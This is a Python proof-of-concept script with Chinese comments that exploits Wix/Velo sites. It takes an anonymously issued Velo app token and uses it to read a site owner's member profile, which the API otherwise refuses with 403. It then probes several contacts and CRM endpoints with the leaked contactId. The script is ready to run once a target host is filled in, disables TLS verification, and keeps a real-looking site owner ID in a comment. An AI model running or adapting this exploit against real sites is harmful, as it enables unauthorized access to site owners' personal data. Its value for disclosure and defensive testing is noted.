#!/usr/bin/env python3
"""Wix/Velo 匿名读取站点业主成员档案 PoC
前置：目标为 Wix 托管的 Velo 站点，/_api/v1/access-tokens 匿名可达。
用法：把 BASE 换成目标域名后直接运行（requests 即可，无需 cookie/账号）。
判据：无令牌 403 MEMBERS.MEMBER_READ；仅加匿名令牌 -> 200 返回 member 对象。
"""
import os, json, requests

requests.packages.urllib3.dontwarn = True
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

UA = os.environ.get('ARTEX_UA', 'Mozilla/5.0')
BASE = 'https://<TARGET_HOST>'          # e.g. https://www.example.co.uk

VELO_APP_UUID = '675bbcef-18d8-41f5-800e-131ec9e08762'   # Wix Velo; 其它：Stores=215238eb-..., MembersArea=14cc59bc-.../22bef345-...

s = requests.Session()
s.headers['User-Agent'] = UA

# step1: 匿名会话
s.get(BASE + '/', timeout=30, verify=False)

# step2: 匿名取得公开应用实例令牌 blob（siteOwnerId 亦在其中明文出现）
at = s.get(BASE + '/_api/v1/access-tokens', timeout=30, verify=False).json()
tok = at['apps'][VELO_APP_UUID]['instance']        # wixcode-pub.<hash>.<jwt>
print("token prefix:", tok[:40], "...")
# siteOwnerId 需从响应里定位（本靶标为 44d89c42-1450-43e0-a931-05cdb8942fa9）
SOID = '<SITE_OWNER_ID>'

# step3a: 不带令牌 -> 期望 403 MEMBERS.MEMBER_READ（阴性对照）
r0 = s.get(BASE + '/_api/members/v1/members/' + SOID,
           headers={'Accept': 'application/json'}, timeout=20, verify=False)
print("STEP3a (no token): %s  %s" % (r0.status_code, r0.text.strip()[:200]))

# step3b: 仅追加匿名令牌 -> 期望 200 返回业主成员档案
r1 = s.get(BASE + '/_api/members/v1/members/' + SOID,
           headers={'Accept': 'application/json', 'Authorization': tok},
           timeout=20, verify=False)
print("STEP3b (+token)  : %s" % r1.status_code)
print(json.dumps(r1.json(), indent=1))

# step4: 用泄露的 contactId 尝试更深 CRM 数据（通常 403，到此为止）
cid = r1.json().get('member', {}).get('contactId')
print("\nleaked contactId:", cid)
for path in ['/_api/contacts/v4/contacts/%s' % cid,
             '/_api/crm/v1/contacts/%s' % cid,
             '/_api/contacts/v1/contacts/%s' % cid,
             '/_api/members/v1/members/%s/contacts' % SOID]:
    r = s.get(BASE + path, headers={'Accept': 'application/json', 'Authorization': tok},
              timeout=20, verify=False)
    print("  [%s] %-48s %s" % (r.status_code, path, r.text[:130].replace('\n', ' ')))

# 期望回显（已脱敏）：
# STEP3a: 403 {"message":"MEMBERS.MEMBER_READ","details":{"applicationError":{"code":"PERMISSION_DENIED"}}}
# STEP3b: 200 {"member":{"id":"<SITE_OWNER_ID>","contactId":"<REDACTED>",
#           "profile":{"nickname":"<REDACTED>","slug":"<REDACTED>",
#                      "photo":{"url":"https://lh3.googleusercontent.com/a/<REDACTED>"}},
#           "createdDate":"2022-04-02T03:22:07Z"}}
